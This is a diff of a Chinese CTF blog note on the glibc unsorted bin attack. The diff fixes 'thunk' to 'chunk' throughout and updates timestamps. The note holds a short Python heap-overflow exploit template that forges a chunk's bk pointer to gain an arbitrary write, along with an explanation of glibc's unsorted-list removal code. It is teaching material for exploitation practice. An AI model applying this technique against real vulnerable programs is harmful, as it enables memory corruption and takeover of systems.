@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://tforevery.github.io/Images/1750237888451-e7f75cdc-6ed1-4766-85e3-bed34b78295b.png">
 <meta property="og:image" content="https://tforevery.github.io/Images/5374ddfc-23cf-47ff-b478-d8035ac83f90.png">
 <meta property="article:published_time" content="2025-12-23T16:50:44.000Z">
-<meta property="article:modified_time" content="2025-12-24T12:20:06.283Z">
+<meta property="article:modified_time" content="2025-12-29T16:25:19.555Z">
 <meta property="article:author" content="TY">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://tforevery.github.io/Images/1750237656883-2fbb0e3d-ede5-4cba-8b17-52ed89050c4e.png">
@@ -549,7 +549,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年12月24日 晚上
+                    本文最后更新于 2025年12月30日 凌晨
                   
                 
               </p>
@@ -558,54 +558,54 @@
               <div class="markdown-body">
                 
                 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/introduction/">CTF-WIKI</a></p>
-<h1 id="Unsortedthunk模板"><a href="#Unsortedthunk模板" class="headerlink" title="Unsortedthunk模板"></a>Unsortedthunk模板</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#amd64-chunk</span><br>Add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;TY&#x27;</span>)<br>Add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;TY&#x27;</span>)<br>Add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;TY&#x27;</span>)<br><br>Del(<span class="hljs-number">1</span>)<br><br>taget = <span class="hljs-number">0x06020C0</span><br>prev_size = <span class="hljs-number">0</span><br>thunck_size = <span class="hljs-number">0x91</span><br>fd = <span class="hljs-number">0</span><br>bk = taget - <span class="hljs-number">0x10</span><br><br>thunk_1 = p(prev_size) + p(thunck_size)<br>thunk_1 += p(fd) + p(bk)<br><br>payload = junk(<span class="hljs-number">0x20</span>)<br>payload += thunck_1<br><br>Edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>Add(<span class="hljs-number">0x80</span>)<br></code></pre></td></tr></table></figure>
+<h1 id="Unsortedchunk模板"><a href="#Unsortedchunk模板" class="headerlink" title="Unsortedchunk模板"></a>Unsortedchunk模板</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#amd64-chunk</span><br>Add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;TY&#x27;</span>)<br>Add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;TY&#x27;</span>)<br>Add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;TY&#x27;</span>)<br><br>Del(<span class="hljs-number">1</span>)<br><br>taget = <span class="hljs-number">0x06020C0</span><br>prev_size = <span class="hljs-number">0</span><br>thunck_size = <span class="hljs-number">0x91</span><br>fd = <span class="hljs-number">0</span><br>bk = taget - <span class="hljs-number">0x10</span><br><br>chunk_1 = p(prev_size) + p(thunck_size)<br>chunk_1 += p(fd) + p(bk)<br><br>payload = junk(<span class="hljs-number">0x20</span>)<br>payload += thunck_1<br><br>Edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>Add(<span class="hljs-number">0x80</span>)<br></code></pre></td></tr></table></figure>
 
 <h1 id="实现要求"><a href="#实现要求" class="headerlink" title="实现要求"></a>实现要求</h1><ul>
 <li>堆溢出</li>
-<li>待unsorted thunk不与TOP thunk相邻</li>
+<li>待unsorted chunk不与TOP chunk相邻</li>
 </ul>
 <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><blockquote>
 <p>这个攻击有点像Unlink，但是可能更高效一点（在进行攻击的时候）但是也有缺点，就是单纯的Unsorted bin Attack下，任意内存写入的数据内容不可控，简单理解下</p>
-<p>当我们申请的<code>thunk-&gt;size &gt;= 0x90</code>的时候，再<code>free(thunk)</code>，该thunk会进入<code>unsortedbin</code></p>
-<p>unsortedbin是个双向链表管理器，通俗来讲，它有个最高等级的（虚假的这里我用虚线来表示）<code>tmp_thunk</code>来管理双向链表</p>
+<p>当我们申请的<code>chunk-&gt;size &gt;= 0x90</code>的时候，再<code>free(chunk)</code>，该chunk会进入<code>unsortedbin</code></p>
+<p>unsortedbin是个双向链表管理器，通俗来讲，它有个最高等级的（虚假的这里我用虚线来表示）<code>tmp_chunk</code>来管理双向链表</p>
 </blockquote>
 <p><img src="/../../../Images/1750237656883-2fbb0e3d-ede5-4cba-8b17-52ed89050c4e.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
-<p>当我要将thunk1从这个双链中脱出</p>
+<p>当我要将chunk1从这个双链中脱出</p>
 <ul>
-<li>更新tmp_thunk-&gt;bk</li>
-<li>更新thunk0-&gt;fd</li>
+<li>更新tmp_chunk-&gt;bk</li>
+<li>更新chunk0-&gt;fd</li>
 </ul>
 </blockquote>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure>
 
 <blockquote>
 <ul>
-<li>victim实际上就是unsortedbin中链表的最后一个thunk（这里就是thunk1）</li>
-<li>那么bck就是thunk0</li>
-<li>unsorted_chunks (av)就是tmp_thunk</li>
+<li>victim实际上就是unsortedbin中链表的最后一个chunk（这里就是chunk1）</li>
+<li>那么bck就是chunk0</li>
+<li>unsorted_chunks (av)就是tmp_chunk</li>
 </ul>
 <p>翻译一下就是</p>
-<p>tmp_thunk-&gt;bk &#x3D; bck &#x3D;&#x3D; victim-&gt;bk</p>
-<p>bck-&gt;fd &#x3D; tmp_thunk</p>
+<p>tmp_chunk-&gt;bk &#x3D; bck &#x3D;&#x3D; victim-&gt;bk</p>
+<p>bck-&gt;fd &#x3D; tmp_chunk</p>
 <ul>
-<li><p>tmp_thunk-&gt;bk &#x3D; victim-&gt;bk</p>
+<li><p>tmp_chunk-&gt;bk &#x3D; victim-&gt;bk</p>
 </li>
-<li><p>victim-&gt;bk-&gt;fd(实际就是bck-&gt;fd：chunk0-&gt;fd) &#x3D; tmp_thunk</p>
+<li><p>victim-&gt;bk-&gt;fd(实际就是bck-&gt;fd：chunk0-&gt;fd) &#x3D; tmp_chunk</p>
 </li>
-<li><p>victim-&gt;bk+2 &#x3D; tmp_thunk</p>
+<li><p>victim-&gt;bk+2 &#x3D; tmp_chunk</p>
 </li>
 </ul>
 <p>看得难受？没事，上图</p>
 </blockquote>
 <p><img src="/../../../Images/1750237667883-2b9d8feb-75d1-4bb7-b681-cc4cb3f87e1d.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
-<p>那也就说，当我们控制了victim-&gt;bk值，那么我们就能将<code>tmp_thunk</code>写入任何地址上，<font style="color:#DF2A3F;">但是</font><code>tmp_thunk</code><font style="color:#DF2A3F;">的值我们无法控制</font></p>
+<p>那也就说，当我们控制了victim-&gt;bk值，那么我们就能将<code>tmp_chunk</code>写入任何地址上，<font style="color:#DF2A3F;">但是</font><code>tmp_chunk</code><font style="color:#DF2A3F;">的值我们无法控制</font></p>
 <p>看表达式</p>
 <ul>
 <li>victim-&gt;bk &#x3D; target-2<ul>
-<li>tmp_thunk-&gt;bk &#x3D; target-2</li>
-<li>victim-&gt;bk+2 [target] &#x3D; tmp_thunk</li>
+<li>tmp_chunk-&gt;bk &#x3D; target-2</li>
+<li>victim-&gt;bk+2 [target] &#x3D; tmp_chunk</li>
 </ul>
 </li>
 </ul>
